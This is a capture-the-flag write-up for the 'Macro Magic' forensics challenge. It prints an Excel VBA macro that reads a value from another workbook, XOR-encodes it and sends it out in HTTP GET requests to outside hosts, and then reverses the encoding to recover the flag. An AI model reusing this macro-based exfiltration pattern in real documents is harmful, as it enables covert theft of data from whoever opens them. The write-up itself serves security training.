# Macro Magic

Category: Forensics (Easy)

Points: 144

Solves: 146

>We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag!

### Solution

We are given a `pcap` file and a Excel spread sheet to analyze. Upon inspection, the Excel spread sheet has a `Monkey` tab with a bunch of monkey pictures and 4 random numbers. The sheet also has a `flag` tab with the word `No`. (All red herrings)

![Monkey](/images/MacroMagicMonkey.png)

Inspecting the `pcap` file we see a bunch of http requests to random websites: Wikipedia Emu War page, downunderctf website, DUCTF challenge website, etc. (Mostly red herrings aswell)

![Wikipedia](/images/MacroMagicEmuWar.png)

Going with the theme of the chal, we find extract the Excel macro and clean off the random comments that say 'Try Harder', 'Totally Not Malware', and 'FAKEFLAG{DUCTF_Fake_Flag}' encoded with decimal then binary then base64. We are left with this VBA script:

```vb
Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1

Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function


Public Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function

Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function

Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function

Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function

Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function

Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function

Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long
    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing (J)
    J = "http://flag.com/"
    superThing (J)
    G = "key"
    J = "http://play.duc.tf/"
    superThing (J)
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing (J)
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing (J)
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing (J)
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    
End Sub
```

Damn, that's a lot of random garbage, since when did Forensics become Reverse Engineering. (Feel free to figure out everything that is happening I will only go over reversing the flag).

Looking through this, let's first isolate where the flag is in the Macro. After a bit of scrolling you can find:

```vb
Path = ThisWorkbook.Path & "\flag.xlsx"
Set wb = Workbooks.Open(Path)
Dim valueA1 As Variant
valueA1 = wb.Sheets(1).Range("A1").Value
...
Q = "Flag: " & valueA1
```

Ok, it seems like we load the value of flag into `Q`. Let's see what `Q` is used for:

```vb
O = doThing(Q, W)
```

I guess we `doThing` `Q` and `W` to get `O`. This is also the only time we use `Q` so let find what `W` is:

```vb
...
S = "Mon"
...
D = "Ma"
...
G = "key"
...
F = "gic"
...
W = S + G + D + F
```

So `W` is `S`+`G`+`D`+`F`. Luckily we can easily find that they are just strings and we get `W = "Mon"+"key"+"Ma"+"gic" = "MonkeyMagic"`.

Now let's go to `O`. Where is it used:
```vb
M = anotherThing(O, W)
A = something(O)
Z = forensics(O)
```

Ugh, it's used 3 times \>\:( Luckily, looking further down the code we can see that only `Z` is used while `M` and `A` are never referenced again \:D So where is `Z` used:

```vb
T = totalyFine(Z)
MsgBox T
J = "http://downunderctf.com/" + T
superThing (J)
```

Interesting, `T` uses `Z`. Then `J` concatenates `http://downunderctf.com/` with `T`. Finally, we `superThing` `J`.

What a long process. To recap this is the code we need to reverse:


```vb
...
S = "Mon"
...
D = "Ma"
...
G = "key"
...
F = "gic"
...
Q = "Flag: " & valueA1
...
W = S + G + D + F
O = doThing(Q, W)
...
Z = forensics(O)
...
T = totalyFine(Z)
MsgBox T
J = "http://downunderctf.com/" + T
superThing (J)
```

Let's see what each of these functions does and reverse step by step:

`superThing`:

We can probably guess this is what sending the http requests seen in the `pcap` file:
```vb
J = "https://play.duc.tf/" + V
superThing (J)
J = "http://flag.com/"
superThing (J)
J = "http://play.duc.tf/"
superThing (J)
J = "http://en.wikipedia.org/wiki/Emu_War"
superThing (J)
```

Checking the real function confirms this:
```vb
Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function
```

Ok, so the last http request to `http://downunderctf.com/` would be `http://downunderctf.com/`+`T`

![Last Request](/images/MacroMagicFlagRequest.png)

So `T` must be: `"11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19"`.

Now we are onto `T = totalyFine(Z)`. `totalyFine`:

```vb
Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function
```
This function just replaces all spaces with a `-` so we can reverse it by changing all `-` to spaces and get `Z`: `"11 3 15 12 95 89 9 52 36 61 37 54 34 90 15 86 38 26 80 19 1 60 12 38 49 9 28 38 0 81 9 2 80 52 28 19"`

Next we are on `Z = forensics(O)`. `forensics`:

```vb
Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```
This function takes in a string `B` and converts all its chars to their unicode value and stores them in array `A`. Then, for each number in `A` we convert the number to a str (123 -> "123"), concatenate it with `C`, and add a space buffer. Finally, it trims off the last space buffer ("123 123 123 " -> "123 123 123"). This will lead to `O`: `[11, 3, 15, 12, 95, 89, 9, 52, 36, 61, 37, 54, 34, 90, 15, 86, 38, 26, 80, 19, 1, 60, 12, 38, 49, 9, 28, 38, 0, 81, 9, 2, 80, 52, 28, 19]` (I'm using an array for the ascii values of the chars because it's easier that way)

Finally, we have `O = doThing(Q, W)` where `Q` is our flag and `W` is `"MonkeyMagic"`. `doThing`:

```vb
Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function
```
This is a classic xor cipher with `B` as the text and `C` as the key. We can easily reverse `Q` by doing `O` xor `W` and we get `Q`: `"Flag: DUCTF{M4d3_W1th_AI_by_M0nk3ys}"`

Simple python code:

```py
>>> key = "MonkeyMagic"
>>> s = "11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19"
>>> s = s.replace("-"," ")
>>> s = list(map(int,s.split()))
>>> ''.join( chr(s[i]^ord(key[i%len(key)])) for i in range(len(s)))
'Flag: DUCTF{M4d3_W1th_AI_by_M0nk3ys}'
```



### Flag

```DUCTF{M4d3_W1th_AI_by_M0nk3ys}```